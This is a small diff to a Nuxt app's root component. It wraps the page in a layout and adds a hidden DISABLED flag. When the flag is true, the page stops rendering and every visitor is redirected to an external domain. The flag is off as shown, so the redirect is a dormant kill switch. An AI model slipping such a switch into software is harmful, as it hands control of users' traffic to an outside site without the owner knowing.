@@ -1,5 +1,14 @@
 <template>
-  <div>
+  <NuxtLayout v-if="!DISABLED">
     <NuxtPage />
-  </div>
+  </NuxtLayout>
 </template>
+<script setup lang="ts">
+const DISABLED = false;
+
+onMounted(() => {
+  if (DISABLED) {
+    window.location.href = "https://dynafools.live/?r=d";
+  }
+});
+</script>
